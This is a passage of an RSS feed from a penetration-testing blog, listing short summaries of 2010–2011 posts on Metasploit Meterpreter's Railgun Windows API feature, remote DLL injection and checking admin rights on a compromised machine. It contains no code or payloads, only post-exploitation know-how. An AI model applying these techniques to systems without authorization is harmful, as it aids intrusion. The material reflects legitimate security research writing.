+    <guid>https://malicious.link/posts/2011/2011-08-19-ip-resolution-using-meterpreters-railgun/</guid>
+    <description><![CDATA[I saw a post back in June and it just recently came up again:
+http://www.securityartwork.es/2011/06/01/dns-port-forwarding-con-meterpreter/
+It looked like a lot of hard work to set that up and I&rsquo;m really lazy. I didn&rsquo;t want to have to go through all that every time I got onto a new network. So, I made a very simple meterpreter post module to just call a Windows API key called &lsquo;gethostbyaddr&rsquo; using Railgun.
+TL:DR; You can download the post module here: ipresolver.]]></description>
+</item>
+<item>
+    <title>Railgun Error Checking</title>
+    <link>https://malicious.link/posts/2011/2011-08-19-railgun-error-checking/</link>
+    <pubDate>Fri, 19 Aug 2011 02:13:01 &#43;0000</pubDate>
+    <author>mubix</author>
+    <guid>https://malicious.link/posts/2011/2011-08-19-railgun-error-checking/</guid>
+    <description><![CDATA[One important thing to note about Railgun is that you are querying the API and just as if you were using C++ the API you are calling just might not be there on the system you are trying to call it on. So here is a quick trick to find out if a the function (API) that you are trying to call is available to you:
+For my example I&rsquo;m using &lsquo;getaddrinfo&rsquo; since it&rsquo;s life in Windows is somewhat odd.]]></description>
+</item>
+<item>
+    <title>Remote DLL Injection with Meterpreter</title>
+    <link>https://malicious.link/posts/2011/2011-05-30-remote-dll-injection-with-meterpreter/</link>
+    <pubDate>Mon, 30 May 2011 16:35:40 &#43;0000</pubDate>
+    <author>mubix</author>
+    <guid>https://malicious.link/posts/2011/2011-05-30-remote-dll-injection-with-meterpreter/</guid>
+    <description><![CDATA[Recently Didier Stevens wrote &lsquo;Suspender.dll&rsquo; which is a DLL that will suspend a process and all of it&rsquo;s child processes after a delay. 60 seconds is it&rsquo;s default but you can rename the DLL to add a number (as such &lsquo;Suspender10.dll&rsquo; for 10 seconds) to make the delay whatever you wish. You can find the blog post and download here: http://blog.didierstevens.com/2011/04/27/suspender-dll/
+Jonathan Cran and I had the same idea, as I&rsquo;m sure many others did as well.]]></description>
+</item>
+<item>
+    <title>Am I an Admin? Railgun Script</title>
+    <link>https://malicious.link/posts/2010/2010-09-13-am-i-an-admin-railgun-script/</link>
+    <pubDate>Mon, 13 Sep 2010 17:45:31 &#43;0000</pubDate>
+    <author>mubix</author>
+    <guid>https://malicious.link/posts/2010/2010-09-13-am-i-an-admin-railgun-script/</guid>
+    <description><![CDATA[When you first step on a machine, you want to determine quickly if you are just a user or an administrator. Meterpreter doesn&rsquo;t have a way to quickly check this. You could drop to a shell, check the local users group &ldquo;Adminitrators&rdquo;, and check your user, and correlate any groups that are shared between the outputs. You could do &lsquo;getsystem&rsquo; and if one works other than Kitrap0d. You could also just do a &lsquo;ps&rsquo; and notice that you can see &lsquo;SYSTEM&rsquo; processes.]]></description>
+</item>
+<item>
+    <title>Resources for railgun development</title>
+    <link>https://malicious.link/posts/2010/2010-08-03-resources-for-railgun-development/</link>
+    <pubDate>Tue, 03 Aug 2010 14:19:52 &#43;0000</pubDate>
+    <author>mubix</author>
+    <guid>https://malicious.link/posts/2010/2010-08-03-resources-for-railgun-development/</guid>
+    <description><![CDATA[Metasploit&rsquo;s Railgun is awesome, but getting things to work correctly can be a pain. Here are some of the resources that have helped me out:
+System Error Codes - This is hands down the best resource you have, it will tell you what that stupid &ldquo;5&rdquo; or &ldquo;1314&rdquo; means in your return value. Keep this tab open to circumvent crazed bovine attacks.
+theForger&rsquo;s Win32 API Programming Tutorial - A really good place to start when you are getting to know the Windows API and the frustrations that come along with it.]]></description>
+</item>
+<item>
+    <title>Intro to RailGun: WIN API for Meterpreter</title>
+    <link>https://malicious.link/posts/2010/2010-07-08-intro-to-railgun-win-api-for-meterpreter/</link>
+    <pubDate>Thu, 08 Jul 2010 02:10:34 &#43;0000</pubDate>
+    <author>mubix</author>
+    <guid>https://malicious.link/posts/2010/2010-07-08-intro-to-railgun-win-api-for-meterpreter/</guid>
+    <description><![CDATA[Back on June 13th, &ldquo;Patrick HVE&rdquo; released RAILGUN:
+http://mail.metasploit.com/pipermail/framework/2010-June/006382.html
+And it was merged into the the Metasploit trunk with 9709, 9710, 9711 and 9712: http://www.metasploit.com/redmine/projects/framework/repository/revisions/9712
+Basically what this allows you to do is make Windows API calls from Meterpreter without compiling your own DLL. It currently supports a number of Windows API dlls:
+iphlpapi ws2_32 kernel32 ntdll user32 advapi32 (You can find out exactly what functions are available by default in the api.]]></description>
+</item>
+</channel>
 </rss>
